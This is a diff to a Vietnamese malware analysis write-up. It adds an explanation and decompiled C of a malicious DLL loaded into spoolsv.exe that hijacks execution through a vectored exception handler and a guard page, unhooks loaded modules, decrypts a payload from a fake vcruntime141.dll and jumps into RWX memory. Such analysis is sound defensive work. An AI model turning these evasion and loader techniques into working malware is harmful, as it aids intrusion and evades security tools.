@@ -727,7 +727,101 @@ ngoài DLLEntrypoint được gọi lúc load thư viện là malicious ra thì 
 <img width="1520" height="448" alt="ảnh" src="https://github.com/user-attachments/assets/38be7772-159d-4ce6-a620-7550d7c94e01" />
 
 
-DLLEntrypoint:
+DllEntrypoint:
+
+<img width="1342" height="436" alt="ảnh" src="https://github.com/user-attachments/assets/a19b2aa7-33f8-4a2b-8754-2556ac42703d" />
+
+DLLMain:
+
+<img width="1022" height="493" alt="ảnh" src="https://github.com/user-attachments/assets/3bfa238d-bec7-48c2-b5dd-bed93533c5b2" />
+
+<img width="1341" height="442" alt="ảnh" src="https://github.com/user-attachments/assets/ed9f8e70-5f27-4a70-afee-7e8e05155709" />
+
+hàm `install_veh` đăng ký 1 hàm handler với `AddVectoredExceptionHandler` rồi sau đó đặt Protection Constants `PAGE_EXECUTE_READ | PAGE_GUARD` cho entrypoint của `spoolsv.exe`
+
+sau khi các dll được load, `spoolsv.exe` vào entrypoint và bị dính exception page guard -> fallback về hàm đã đăng ký VEH
+
+<img width="1076" height="207" alt="ảnh" src="https://github.com/user-attachments/assets/9366e4e6-590e-4da6-9726-1f11a791ed9c" />
+
+<img width="1345" height="412" alt="ảnh" src="https://github.com/user-attachments/assets/2ae88d64-6a63-4fa3-8a53-06b44621b7f9" />
+
+hàm này xác định nếu là exception page guard thì sẽ trả lại protect cũ và đặt context rip vào hàm `loader` để tiếp tục thực thi
+
+loader:
+
+```c
+void loader()
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  v13 = -2LL;
+  v11[0] = 0LL;
+  v11[1] = v12;
+  v11[2] = 0x104LL;
+  decode_str_kernel32_dll(
+    kernel32_dll,                               // "kernel32.dll"
+    0x7FFFECD283B2LL);
+  decode_str_getmodulefilenamea(
+    (CHAR *)GetModuleFileNameA,                 // "GetModuleFileNameA"
+    0x7FFFECD284AELL);
+  v10 = threadpool_work(
+          kernel32_dll,                         // "kernel32.dll"
+          (const CHAR *)GetModuleFileNameA,     // "GetModuleFileNameA"
+          (__int64)v11,
+          3u,
+          0);
+  sub_7FFFECD02DB0((__int64)v9, (__int64)v12);
+  decode_str_backslash((__int64)&unk_7FFFECD326F0, 0x7FFFECD284E6LL);
+  v0 = ((__int64 (__fastcall *)(_BYTE *, void *, __int64))sub_7FFFECD14030)(v9, &unk_7FFFECD326F0, -1LL);
+  build_string_slice((__int64)v9, (__int64)v8, 0LL, v0);
+  decode_str_vcruntime141_path_suffix(
+    aVcruntime141Dl,                            // "\\vcruntime141.dll"
+    0x7FFFECD2851DLL);
+  append_string_to_buffer(path_string, (__int64)v8, 0x7FFFECD326F8LL);
+  restore_all_loaded_module_text_sections();
+  initialize_hashed_api_resolvers();
+  dword_7FFFECD32020 = 0;
+  v6 = 0LL;
+  v5 = xmmword_7FFFECD28300;
+  decode_str_kernel32_dll(
+    kernel32_dll,                               // "kernel32.dll"
+    0x7FFFECD283B2LL);
+  decode_str_heapcreate(
+    (CHAR *)HeapCreate,                         // "HeapCreate"
+    0x7FFFECD28558LL);
+  payload_private_heap = (void *)threadpool_work(
+                                   kernel32_dll,// "kernel32.dll"
+                                   (const CHAR *)HeapCreate,// "HeapCreate"
+                                   (__int64)&v5,
+                                   3u,
+                                   0);
+  ::payload_private_heap = payload_private_heap;
+  sub_7FFFECD03090(vector_object, 0x84A44F320A974C2LL);
+  load_and_decrypt_payload_file(output_vector, path_string);
+  sub_7FFFECD143B0(vector_object, output_vector);
+  sub_7FFFECD031D0(output_vector);
+  v1[0] = 0LL;
+  v1[1] = sub_7FFFECD14510(vector_object);
+  v1[2] = 0x3000LL;
+  v1[3] = 64LL;
+  decode_str_kernel32_dll(
+    kernel32_dll,                               // "kernel32.dll"
+    0x7FFFECD283B2LL);
+  decode_str_virtualalloc(
+    (CHAR *)VirtualAlloc_0,                     // "VirtualAlloc"
+    0x7FFFECD283F1LL);
+  decrypted_payload_rwx = (void *)threadpool_work(
+                                    kernel32_dll,// "kernel32.dll"
+                                    (const CHAR *)VirtualAlloc_0,// "VirtualAlloc"
+                                    (__int64)v1,
+                                    4u,
+                                    0);
+  __asm { jmp     rax }
+}
+```
+
+hàm này resolve các api cần thiết, lấy path và decrypt `vcruntime141.dll`, ngoài ra còn có hàm `restore_all_loaded_module_text_sections` tự map và ghi đè lại các modules để gỡ hook 
+
 
 
 
